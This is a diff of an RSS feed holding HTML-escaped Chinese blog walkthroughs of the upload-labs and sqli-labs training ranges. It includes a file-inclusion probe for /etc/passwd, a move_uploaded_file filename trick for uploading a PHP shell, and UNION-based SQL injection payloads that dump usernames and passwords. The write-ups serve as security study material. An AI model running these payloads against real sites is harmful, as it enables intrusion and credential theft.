 &lt;p&gt;可以看到payload没有被删除，个人感觉gif是最简单的。&lt;/p&gt;
-&lt;h4 id=&#34;jpg&#34;&gt;jpg&lt;/h4&gt;
-&lt;h4 id=&#34;png&#34;&gt;png&lt;/h4&gt;
-&lt;p&gt;这两个都需要脚本进行修改，人比较懒后面再进行补充&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-8&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;上面的方法是我们如何将payload成功填入文件，并上传，但上传后该怎么使用呢。其实可以注意到这关的网址和之前是有一点区别的&lt;/p&gt;
+&lt;h4 id=&#34;jpg&#34;&gt;jpg
+&lt;/h4&gt;&lt;h4 id=&#34;png&#34;&gt;png
+&lt;/h4&gt;&lt;p&gt;这两个都需要脚本进行修改，人比较懒后面再进行补充&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-8&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;上面的方法是我们如何将payload成功填入文件，并上传，但上传后该怎么使用呢。其实可以注意到这关的网址和之前是有一点区别的&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://ip:30011/?file=hint.html
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;多了一个&lt;code&gt;file&lt;/code&gt;参数，在没有看源码时可以猜测，这里可能存在文件包含漏洞，我们传入&lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171321855.png&#34;
@@ -537,8 +537,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;upload-12-move_uploaded_file缺陷&#34;&gt;upload-12 [move_uploaded_file缺陷]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405042013577.png&#34;
+&lt;h2 id=&#34;upload-12-move_uploaded_file缺陷&#34;&gt;upload-12 [move_uploaded_file缺陷]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405042013577.png&#34;
 	
 	
 	
@@ -548,10 +548,10 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-10&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;这里要用到&lt;code&gt;move_uploaded_file&lt;/code&gt;函数的一个缺陷。当我们能能控制&lt;code&gt;$img_path&lt;/code&gt;的值时，如果我们输入&lt;code&gt;1.php/.&lt;/code&gt;，该函数会将其判断为&lt;code&gt;1.php&lt;/code&gt;，但是由于我们在上传时文件名是&lt;code&gt;1.php/.&lt;/code&gt;，所以可以绕过黑名单&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-9&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405042228585.png&#34;
+&lt;h3 id=&#34;漏洞分析-10&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;这里要用到&lt;code&gt;move_uploaded_file&lt;/code&gt;函数的一个缺陷。当我们能能控制&lt;code&gt;$img_path&lt;/code&gt;的值时，如果我们输入&lt;code&gt;1.php/.&lt;/code&gt;，该函数会将其判断为&lt;code&gt;1.php&lt;/code&gt;，但是由于我们在上传时文件名是&lt;code&gt;1.php/.&lt;/code&gt;，所以可以绕过黑名单&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-9&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405042228585.png&#34;
 	
 	
 	
@@ -573,8 +573,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可以看到文件成功上传&lt;/p&gt;
-&lt;h2 id=&#34;upload-13-代码审计&#34;&gt;upload-13 [代码审计]&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052234676.png&#34;
+&lt;h2 id=&#34;upload-13-代码审计&#34;&gt;upload-13 [代码审计]
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052234676.png&#34;
 	
 	
 	
@@ -584,8 +584,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;漏洞分析-11&#34;&gt;漏洞分析&lt;/h3&gt;
-&lt;p&gt;既然这里说到了要代码审计，那就直接查看代码，这就是关键代码&lt;/p&gt;
+&lt;h3 id=&#34;漏洞分析-11&#34;&gt;漏洞分析
+&lt;/h3&gt;&lt;p&gt;既然这里说到了要代码审计，那就直接查看代码，这就是关键代码&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-type: text/html;charset=utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
@@ -652,10 +652,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里定义就是文件上传后的命名以及存储位置。比如&lt;code&gt;$file=array[&#39;1&#39;,&#39;jpg&#39;]&lt;/code&gt; ，上传后的文件名就是&lt;code&gt;1.jpg&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;接下来就是该如何通过这关，我们的突破口就在&lt;code&gt;save_name&lt;/code&gt;中，我们传入&lt;code&gt;save_name[0]=shell.php/      save_name[2]=png&lt;/code&gt;在检测后缀时，因为该数组最后一位是&lt;code&gt;png&lt;/code&gt;所以可以绕过。在存储文件时我们存储文件名就会变成&lt;code&gt;shell.php/.&lt;/code&gt;，因为用到了&lt;code&gt;move_uploaded_file&lt;/code&gt;函数缺陷，我们仍然上传了&lt;code&gt;shell.php&lt;/code&gt;。&lt;/p&gt;
-&lt;h4 id=&#34;注&#34;&gt;注&lt;/h4&gt;
-&lt;p&gt;这里为什么要传&lt;code&gt;save_name[2]&lt;/code&gt;,因为&lt;code&gt;$file[count($file) - 1]  ==   $file[2-1]&lt;/code&gt;而我们&lt;code&gt;$file[1]&lt;/code&gt;是一个空值。&lt;/p&gt;
-&lt;h3 id=&#34;解决方法-10&#34;&gt;解决方法&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052304172.png&#34;
+&lt;h4 id=&#34;注&#34;&gt;注
+&lt;/h4&gt;&lt;p&gt;这里为什么要传&lt;code&gt;save_name[2]&lt;/code&gt;,因为&lt;code&gt;$file[count($file) - 1]  ==   $file[2-1]&lt;/code&gt;而我们&lt;code&gt;$file[1]&lt;/code&gt;是一个空值。&lt;/p&gt;
+&lt;h3 id=&#34;解决方法-10&#34;&gt;解决方法
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052304172.png&#34;
 	
 	
 	
@@ -683,11 +683,11 @@
         <pubDate>Sun, 14 Apr 2024 22:48:59 +0800</pubDate>
         
         <guid>https://blog.winglet.com/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/</guid>
-        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif" alt="Featured image of post Sql Labs靶场 [更新中]" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-&lt;p&gt;之前总是打了几关就摆了，这次一定打完。&lt;/p&gt;
-&lt;h2 id=&#34;sql注入基础&#34;&gt;sql注入基础&lt;/h2&gt;
-&lt;h2 id=&#34;less---1&#34;&gt;less - 1&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211102977.png&#34;
+        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif" alt="Featured image of post Sql Labs靶场 [更新中]" /&gt;&lt;h2 id=&#34;前言&#34;&gt;前言
+&lt;/h2&gt;&lt;p&gt;之前总是打了几关就摆了，这次一定打完。&lt;/p&gt;
+&lt;h2 id=&#34;sql注入基础&#34;&gt;sql注入基础
+&lt;/h2&gt;&lt;h2 id=&#34;less---1&#34;&gt;less - 1
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211102977.png&#34;
 	
 	
 	
@@ -761,8 +761,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;?id=-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;security&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;?id=-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---2&#34;&gt;less - 2&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211740465.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---2&#34;&gt;less - 2
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211740465.png&#34;
 	
 	
 	
@@ -791,8 +791,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;security&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---3&#34;&gt;less - 3&lt;/h2&gt;
-&lt;p&gt;先判断类型&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---3&#34;&gt;less - 3
+&lt;/h2&gt;&lt;p&gt;先判断类型&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;		&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;------		正常
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;		------		报错
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里报错显示如下&lt;/p&gt;
@@ -814,8 +814,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;?id=-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;security&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;?id=-1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---4&#34;&gt;less - 4&lt;/h2&gt;
-&lt;p&gt;还是判断闭合符，这里是通过审计源代码才知道闭合符为&lt;code&gt;&amp;quot;)&lt;/code&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---4&#34;&gt;less - 4
+&lt;/h2&gt;&lt;p&gt;还是判断闭合符，这里是通过审计源代码才知道闭合符为&lt;code&gt;&amp;quot;)&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;)		------			报错
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211831781.png&#34;
 	
@@ -831,8 +831,8 @@
